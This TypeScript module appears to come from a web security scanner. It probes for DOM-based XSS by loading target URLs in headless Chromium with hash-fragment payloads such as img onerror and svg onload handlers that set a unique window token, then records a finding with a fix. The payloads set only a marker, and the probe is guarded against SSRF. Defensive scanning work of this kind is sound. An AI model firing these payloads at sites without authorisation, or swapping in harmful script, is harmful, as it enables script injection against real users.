// DOM-based XSS probe. Unlike reflected/stored XSS (which appear in the HTTP
// response body), DOM XSS never touches the server response — a client-side
// script reads an attacker-controllable source (location.hash/search) and writes
// it to a dangerous sink (innerHTML, document.write, eval). The only way to
// PROVE it is to execute the page's JavaScript, so this probe drives a headless
// browser: it loads the target with a unique payload in location.hash and checks
// whether that payload actually executed (set a global / fired a dialog). It is
// gated behind ENABLE_BROWSER_RENDERING (same opt-in as the crawl renderer) and
// is otherwise a no-op. The browser interaction is injected as a driver so the
// probe's logic is unit-tested without launching Chromium.
import crypto from "crypto";
import type { ExploitEvidence } from "../src/types.js";
import { isRenderingEnabled, hostLooksInternal } from "./render.js";

export interface DomXssHit {
  payload: string; // the full location.hash value that executed
  token: string;   // the unique token our payload set on window
  html: string;    // DOM snapshot at detection, for the receipt
}

// Hash-source payloads. Each, IF it reaches an HTML sink, inserts an element
// whose onerror/onload sets window.__seclayerDom to our unique token — a
// detectable, unforgeable proof of execution. `token` is embedded so a verbatim
// match can only come from OUR payload running.
export function buildDomXssPayloads(token: string): string[] {
  const set = `window.__seclayerDom='${token}'`;
  return [
    `#<img src=x onerror="${set}">`,
    `#<svg onload="${set}">`,
    `#"><img src=x onerror="${set}">`,
    `#<img src=x onerror=${set}>`,
  ];
}

// Assemble the PROVEN finding from a confirmed execution. The receipt's response
// records the exact proof (window.__seclayerDom === token) plus a DOM snapshot,
// so signal.quote (the token) is a literal substring — the token can only appear
// because our hash payload hit a live DOM sink and ran.
export function domXssFinding(url: string, hit: DomXssHit): any {
  const attackUrl = `${url}${hit.payload}`;
  const snapshot = (hit.html || "").slice(0, 1500);
  const response =
    `Headless browser executed the injected DOM payload.\n` +
    `window.__seclayerDom === "${hit.token}"\n\n` +
    `--- DOM snapshot (truncated) ---\n${snapshot}`;
  const evidence: ExploitEvidence = {
    method: "oracle",
    attack: {
      request: `GET ${attackUrl}\n(loaded in a headless browser; the fragment after # is read by client-side JavaScript)`,
      response,
    },
    signal: {
      quote: hit.token,
      offsetInResponse: response.indexOf(hit.token),
      why: `Our payload placed in location.hash set window.__seclayerDom to this unique token. That only happens if a client-side script wrote the hash into a DOM sink (innerHTML/document.write) and the browser executed it — DOM-based XSS.`,
    },
    demonstration: `We loaded ${url} with "${hit.payload}" in the URL fragment and a headless browser executed our injected JavaScript (it set a unique marker we can read back). A page's own client-side code is passing the fragment into a dangerous sink, so an attacker-crafted link runs script in a victim's browser.`,
    reproduction: `Open ${attackUrl} in a browser and observe the injected onerror/onload handler run.`,
    capturedAt: new Date().toISOString(),
  };
  return {
    testName: "DOM-based Cross-Site Scripting (client-side sink)",
    payload: hit.payload,
    severity: "high",
    description:
      "A client-side script reads an attacker-controllable source (the URL fragment / location.hash) and writes it into a dangerous DOM sink (innerHTML, document.write, or eval) without encoding. A headless browser confirmed the injected payload executes. Because it happens entirely in the browser, it is invisible to server-side WAFs and to response-body scanning.",
    fix: "Never pass untrusted values (location.hash/search/href, postMessage, referrer) into innerHTML/outerHTML/document.write/eval or framework raw-HTML bindings. Use textContent / safe DOM APIs, and deploy a restrictive Content-Security-Policy (no unsafe-inline) as defense-in-depth.",
    evidence,
  };
}

// Browser driver signature — injected so probeDomXss is testable without a real
// browser. Returns the first payload that executed, or null.
export type DomXssDriver = (
  url: string,
  headers: Record<string, string>,
  payloads: string[],
  token: string,
) => Promise<DomXssHit | null>;

// The real driver: reuses render.ts's Chromium launch + SSRF hardening. Loads the
// target with each hash payload in turn and reads back window.__seclayerDom.
const playwrightDriver: DomXssDriver = async (url, headers, payloads, token) => {
  try {
    const u = new URL(url);
    if ((u.protocol !== "http:" && u.protocol !== "https:") || hostLooksInternal(u.hostname)) return null;
  } catch {
    return null;
  }

  let pw: any;
  try {
    const pkg = "playwright";
    pw = await import(pkg);
  } catch {
    console.warn('[domxss] ENABLE_BROWSER_RENDERING is set but "playwright" is not installed; skipping DOM-XSS probe.');
    return null;
  }

  let browser: any;
  try {
    browser = await pw.chromium.launch({ headless: true, args: ["--no-sandbox", "--disable-dev-shm-usage"] });
    const ctx = await browser.newContext({ extraHTTPHeaders: headers, ignoreHTTPSErrors: true, serviceWorkers: "block" });
    const page = await ctx.newPage();

    let dialogFired = false;
    page.on("dialog", (d: any) => { if ((d.message() || "").includes(token)) dialogFired = true; d.dismiss().catch(() => {}); });

    // Same SSRF filter as render.ts for every request the page makes.
    await page.route("**/*", (route: any) => {
      try {
        const ru = new URL(route.request().url());
        if ((ru.protocol !== "http:" && ru.protocol !== "https:") || hostLooksInternal(ru.hostname)) return route.abort();
      } catch {
        return route.abort();
      }
      return route.continue();
    });

    for (const payload of payloads) {
      dialogFired = false;
      try {
        // Fresh document each iteration so the hash is re-read from scratch.
        await page.goto("about:blank").catch(() => {});
        await page.goto(`${url}${payload}`, { waitUntil: "load", timeout: 10000 }).catch(() => {});
        await page.waitForTimeout(400);
        const executed = await page.evaluate(`window.__seclayerDom === ${JSON.stringify(token)}`).catch(() => false);
        if (executed || dialogFired) {
          const html = await page.content().catch(() => "");
          return { payload, token, html };
        }
      } catch {
        /* try the next payload */
      }
    }
    return null;
  } catch (err: any) {
    console.warn(`[domxss] headless DOM-XSS probe failed: ${err?.message || err}`);
    return null;
  } finally {
    try { await browser?.close(); } catch {}
  }
};

export async function probeDomXss(
  url: string,
  headers: Record<string, string>,
  driver?: DomXssDriver,
): Promise<any | null> {
  // Use the injected driver (tests) or the real browser driver only when
  // headless rendering is enabled; otherwise this is a clean no-op.
  const drive = driver ?? (isRenderingEnabled() ? playwrightDriver : null);
  if (!drive) return null;

  const token = "dom" + crypto.randomBytes(6).toString("hex");
  const payloads = buildDomXssPayloads(token);
  let hit: DomXssHit | null;
  try {
    hit = await drive(url, headers, payloads, token);
  } catch {
    return null;
  }
  return hit ? domXssFinding(url, hit) : null;
}
